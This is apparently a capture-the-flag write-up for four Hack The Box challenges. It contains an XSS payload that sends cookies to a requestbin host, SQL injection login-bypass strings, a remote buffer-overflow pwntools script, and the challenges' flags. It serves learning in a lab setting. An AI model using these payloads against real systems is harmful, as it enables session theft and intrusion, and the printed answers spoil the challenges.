# baby APT

![](https://i.imgur.com/4sC0UhS.png)

```
unzip forensics_baby_apt.zip
wireshark christmaswishlist.pcap
```
filter by HTTP and follow TCP stream
![](https://i.imgur.com/E2OCrCn.png)

>SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59
>HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}

---

# Toy Workshop
![](https://i.imgur.com/ea6Z4Ji.png)

![](https://i.imgur.com/GnxWYrl.png)
![](https://i.imgur.com/Zr6hxs3.png)
![](https://i.imgur.com/BlmCxlT.png)
```
X-Forwarded-For: 127.0.0.1
```
not working so then it came to mind to steal the cookie since there was a fake flag within a cookie

![](https://i.imgur.com/Chzn6cV.png)
```
<img src=x onerror=this.src='https://requestbin.io/1dc0lwe1?'+document.cookie;>
```
i was hinted: https://requestbin.io/

![](https://i.imgur.com/2T5Y6Y1.png)

---

# Toy Management

![](https://i.imgur.com/qzOnrkW.png)
![](https://i.imgur.com/szqoi4T.png)

```
admin' OR 1=1 -- 
```
didnt work so lets try string
```
admin' OR '1'='1 -- 
```
![](https://i.imgur.com/qhjSrFG.png)

>HTB{1nj3cti0n_1s_in3v1t4bl3}

---

# Mr Snowy
![](https://i.imgur.com/xrVvQZK.png)

```
gdb ./mr_snowy
info function

```
![](https://i.imgur.com/TXdkTzF.png)

we noticed the size was 64 + 8 = 72 bytes
and 0x401165 was the location of the function we need to call
```
python3 -c "from pwn import *; print(b'A'*72+p64(0x401165))"
```
so tested it locally 
```
from pwn import *

target = process("./mr_snowy");

target.sendlineafter(">", b'1');
target.sendlineafter(">", b'A'*72 + p64(0x401165));

target.interactive();
```
but to run on remote we had to tweak the code a bit
```
from pwn import *

#target = process("./mr_snowy");

target = remote('178.62.32.210',32687);

target.sendlineafter(">", b'1');
target.sendlineafter(">", b'A'*72 + p64(0x401165));

target.interactive();
```
>HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}

